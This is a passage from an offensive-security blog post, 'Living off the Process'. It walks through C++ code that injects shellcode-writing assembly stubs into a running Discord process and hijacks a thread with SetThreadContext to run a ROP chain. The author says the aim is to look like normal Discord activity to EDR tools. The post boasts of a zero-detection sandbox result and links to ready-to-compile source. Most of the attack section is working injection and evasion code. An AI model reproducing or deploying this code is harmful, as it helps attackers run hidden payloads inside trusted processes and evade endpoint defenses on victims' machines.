Let’s dive in right where we left off. Here’s a visual of the code execution for all the assembly stubs getting added to our dedicated Gadgets memory address at the 0x800 mark. You can see the individual shellcode chunks in RAX and the shellcode memory address we’re writing to. notice how the shellcode memory address is incremented by 8:

![image](https://github.com/user-attachments/assets/eb03eb5d-e59e-40fa-961e-cf966e13fb54)

Now, go back in to `x64dbg` which is still attached to our `Discord` process. Copy the code stub address, and in Discord do another control + G, paste in that address, and hit enter. You’ll see our assembly stubs!

![image](https://github.com/user-attachments/assets/03e1c58a-4963-40ea-b9d3-ceb4975c1a55)

This is where the magic happens folks 😸 This is the indirect writing mechanism I discussed briefly earlier. We will be indirectly writing our shellcode chunks into the dedicated shellcode memory using the `mov [rax], r8; ret` gadget and NOT WriteVirtualMemory. It will appear to an EDR engine like this is just part of Discord’s normal functionality 😄

Well if you’ve made it this far I extend a massive kudos to you! I know this is a lot to take in. We’re almost there though. First, here’s the code for this section:

```
//*************************************************
// Generate assembly stubs to set R8 and RAX
//*************************************************
std::wcout << L"\n[*] Generating code stubs..." << std::endl;

std::vector<unsigned char> allStubs;
uintptr_t writeAddr = (uintptr_t)remoteShellcode;

for (size_t i = 0; i < numChunks; i++) {
    // Extract 8-byte chunk from shellcode
    uint64_t chunk = 0;
    size_t bytesToCopy = min(8, base_size - (i * 8));
    memcpy(&chunk, shellcode_base + (i * 8), bytesToCopy);

    // Build stub:
    // mov r8, <chunk>      ; 10 bytes: 49 B8 [qword]
    // mov rax, <writeAddr> ; 10 bytes: 48 B8 [qword]
    // ret                  ; 1 byte:  C3

    unsigned char stub[32] = { 0 };
    int offset = 0;

    // mov r8, imm64
    stub[offset++] = 0x49;
    stub[offset++] = 0xB8;
    memcpy(&stub[offset], &chunk, 8);
    offset += 8;

    // mov rax, imm64
    stub[offset++] = 0x48;
    stub[offset++] = 0xB8;
    memcpy(&stub[offset], &writeAddr, 8);
    offset += 8;

    // ret
    stub[offset++] = 0xC3;

    // Pad with NOPs
    for (int j = offset; j < 32; j++) {
        stub[j] = 0x90;
    }

    allStubs.insert(allStubs.end(), stub, stub + 32);

    std::wcout << L"[+] Stub " << i << L": R8=0x" << std::hex << chunk
        << L", RAX=0x" << writeAddr << std::dec << std::endl;

    writeAddr += 8;
}

// Write stubs to gadgets region
if (!WriteProcessMemory(hProcess, codeStubs, allStubs.data(),
    allStubs.size(), &bytesWritten)) {
    std::wcout << L"[!] WriteProcessMemory (stubs) failed: " << GetLastError() << std::endl;
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 1;
}
std::wcout << L"[+] Code stubs written (" << bytesWritten << L" bytes)" << std::endl;
```

Now on to the final section: Setting up our Thread Context and Resuming our hijacked thread to execute our ROP chain and assembly stubs!

## The Final Stretch - Manipulating our Hijacked thread to Execute our ROP gadgets and Assembly Stubs! [Permalink](https://g3tsyst3m.com/lotp/Living-off-the-Process/\#the-final-stretch---manipulating-our-hijacked-thread-to-execute-our-rop-gadgets-and-assembly-stubs "Permalink")

Believe it or not, the final portion of code and the conclusion to our Living off the Process demonstration is not too crazy. We just need to do the following, in order:

- Suspend our hijacked thread
- Get the Thread’s current thread context
- Set the `RIP` register to our code stubs within the Gadgets memory region and the `RSP` register to our Gadget’s primary memory address
- Set the Thread Context to our new Register Values
- Resume the Thread!

Here’s how that looks as far as code goes:

```
 //*************************************************
 // Set up thread context and execute
 //*************************************************
 std::wcout << L"\n[*] Setting up thread context..." << std::endl;

 if (SuspendThread(hThread) == (DWORD)-1) {
     std::wcout << L"[!] SuspendThread failed: " << GetLastError() << std::endl;
     CloseHandle(hThread);
     CloseHandle(hProcess);
     return 1;
 }

 CONTEXT ctx = {};
 ctx.ContextFlags = CONTEXT_ALL;

 if (!GetThreadContext(hThread, &ctx)) {
     std::wcout << L"[!] GetThreadContext failed: " << GetLastError() << std::endl;
     ResumeThread(hThread);
     CloseHandle(hThread);
     CloseHandle(hProcess);
     return 1;
 }

 // Set initial state
 ctx.Rip = (DWORD64)codeStubs;           // Start at first stub
 ctx.Rsp = (DWORD64)remoteGadgets;       // Stack points to ROP chain

 if (!SetThreadContext(hThread, &ctx)) {
     std::wcout << L"[!] SetThreadContext failed: " << GetLastError() << std::endl;
     ResumeThread(hThread);
     CloseHandle(hThread);
     CloseHandle(hProcess);
     return 1;
 }

 std::wcout << L"[+] Thread context set:" << std::endl;
 std::wcout << L"    RIP = 0x" << std::hex << ctx.Rip << L" (first stub)" << std::endl;
 std::wcout << L"    RSP = 0x" << ctx.Rsp << L" (ROP chain)" << std::endl;
  std::wcout << L"\n[!] Press ENTER to execute ROP chain..." << std::endl;
 std::cin.get();

  // Execute!
 if (ResumeThread(hThread) == (DWORD)-1) {
     std::wcout << L"[!] ResumeThread failed: " << GetLastError() << std::endl;
     CloseHandle(hThread);
     CloseHandle(hProcess);
     return 1;
 }

 std::wcout << L"[+] ROP chain executing!" << std::endl;
 std::wcout << L"[*] Waiting for shellcode to complete..." << std::endl;
 std::wcout << L"[+] Execution complete!" << std::endl;

 return 0;
```

And here’s a quick video demonstration of walkthing through each code stub and ROP gadget, showing shellcode getting copied to the dedicated Shellcode memory region, and switching over to our fake stack address:

LOTP - YouTube

[Photo image of R.B.C.](https://www.youtube.com/channel/UC2Q1udfnPuOnr7pBge3YgDA?embeds_referring_euri=https%3A%2F%2Fg3tsyst3m.com%2F)

R.B.C.

47 subscribers

[LOTP](https://www.youtube.com/watch?v=9sLomBhNa4A)

R.B.C.

Search

Watch later

Share

Copy link

Info

Shopping

Tap to unmute

If playback doesn't begin shortly, try restarting your device.

More videos

## More videos

You're signed out

Videos you watch may be added to the TV's watch history and influence TV recommendations. To avoid this, cancel and sign in to YouTube on your computer.

CancelConfirm

Share

Include playlist

An error occurred while retrieving sharing information. Please try again later.

[Watch on](https://www.youtube.com/watch?v=9sLomBhNa4A&embeds_referring_euri=https%3A%2F%2Fg3tsyst3m.com%2F)

0:00

0:00 / 2:08

•Live

•

Apologies that I jumped straight to executing the shellcode toward the end there. I thought I had more breakpoints set 😆 If you want to see how the entire process plays out in greater detail, I’ll have the full video walkthrough available for those that subscribe to me on ko-fi. Thanks, and hope you enjoyed this demonstration of my take on Living off the Process. Until next time!

**Full Source Code ready to compile (Be sure to set the Build to ‘Release’ in Visual Studio!):** [Source Code](https://github.com/g3tsyst3m/CodefromBlog/tree/main/2026-1-29-Living%20off%20the%20Process)

## **_Bonus Content for Members! (Sapphire Tier)_** [Permalink](https://g3tsyst3m.com/lotp/Living-off-the-Process/\#bonus-content-for-members-sapphire-tier "Permalink")

📹 In-Depth Video/Audio Walkthrough for today’s blog post: [In-Depth Video Walkthrough](https://ko-fi.com/s/35ab60ff88)

🗒️ Updated Source Code to go with the Video: [Source Code for Video Walkthrough](https://ko-fi.com/s/00e5869580)

## **_Bonus Content for Members! (Emerald + Diamond Tiers)_** [Permalink](https://g3tsyst3m.com/lotp/Living-off-the-Process/\#bonus-content-for-members-emerald--diamond-tiers "Permalink")

📓RWX Scanner Tool for detecting RWX memory regions in all processes [RWX Scanner Tool](https://ko-fi.com/s/4a8a0dc254)

📹📓 Video walkthrough + Source code for Assembly to Machine code & Rop Gadget lookup toolkit!: [Video explaining ROP gadget and Assembly to Machine Code Tools](https://ko-fi.com/s/825b8ee3e4)

📔 LOTP Exclusive Final Code Update - Hijacking a worker thread [LOTP & Hijacking a worker thread](https://ko-fi.com/s/12ba29993b)

## **_ANY.RUN Sandboxing_** [Permalink](https://g3tsyst3m.com/lotp/Living-off-the-Process/\#anyrun-sandboxing "Permalink")

**0 / 100 Detection Rate!!!:**

![image](https://github.com/user-attachments/assets/62edfbf8-2345-49ee-a30a-860f78cca223)

[Full Sandbox Analysis](https://app.any.run/tasks/7c5f7772-79b3-41a0-8ad0-863095cf6e48)

**Sponsored By:**

![image](https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/anyrun.png)![image](https://raw.githubusercontent.com/g3tsyst3m/g3tsyst3m.github.io/refs/heads/master/assets/images/vector35.png)

#### Share on

[Twitter](https://twitter.com/intent/tweet?text=Living+off+the+Process%20https%3A%2F%2Fg3tsyst3m.com%2Flotp%2FLiving-off-the-Process%2F "Share on Twitter") [Facebook](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fg3tsyst3m.com%2Flotp%2FLiving-off-the-Process%2F "Share on Facebook") [LinkedIn](https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fg3tsyst3m.com%2Flotp%2FLiving-off-the-Process%2F "Share on LinkedIn")

#### Leave a comment

## You may also enjoy

![](https://g3tsyst3m.com/assets/images/chunkyshellcode.png)

## [Evading Signature Based Memory Detection - Shellcode Fragmentation and Staged Reassembly](https://g3tsyst3m.com/shellcode%20fragmentation/in-memory%20evasion/Evading-Signature-Based-Memory-Detection-Shellcode-Fragmentation-and-Staged-Reassembly/)

December 23, 2025

11 minute read



Hey everyone, and hope the holiday season is treating you well! 🎅🎄🎁 I’ve been sitting on this blog post for quite some time now and it’s high time I went a...

![](https://g3tsyst3m.com/assets/images/memmapper2.png)

## [PIC Shellcode from the Ground up - Part 2](https://g3tsyst3m.com/shellcode/pic/PIC-Shellcode-from-the-Ground-up-Part-2/)

November 25, 2025

20 minute read



Let’s PIC back up where we left off shall we? 😸 I gave you the framework for developing PIC friendly shellcode back in Part 1. We went from the original cod...

![](https://g3tsyst3m.com/assets/images/memmapper.png)

## [PIC Shellcode from the Ground up - Part 1](https://g3tsyst3m.com/shellcode/pic/PIC-Shellcode-from-the-Ground-up-Part-1/)

November 5, 2025

23 minute read



Have you ever wondered how the popularized PIC (position independent code) actually works? I can answer that question alongside you with a resounding YES! Y...

![](https://g3tsyst3m.com/assets/images/polymorphic.png)

## [Let’s Create Some Polymorphic PIC Shellcode!](https://g3tsyst3m.com/shellcode/pic/Let's-Create-Some-Polymorphic-PIC-Shellcode!/)

October 19, 2025

17 minute read



Alright I’ll admit I’m pretty pumped for today’s post 😸 Shellcode and x64 Assembly are one of my favorite topics to cover. I don’t know why, but something ...